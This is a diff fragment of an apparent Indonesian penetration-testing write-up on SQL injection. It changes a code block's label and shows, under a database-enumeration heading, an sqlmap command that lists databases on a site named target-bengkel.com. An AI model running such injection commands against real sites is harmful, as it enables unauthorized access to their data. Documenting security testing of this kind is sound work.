@@ -38,5 +38,5 @@ Setelah celah terverifikasi secara manual, dilakukan eksploitasi otomatis menggu
 
 **A. Enumerasi Database:**
 Mencari daftar database yang tersedia di server.
-```bash
+```text
 sqlmap -u "[http://target-bengkel.com/detail.php?id=1](http://target-bengkel.com/detail.php?id=1)" --batch --dbs
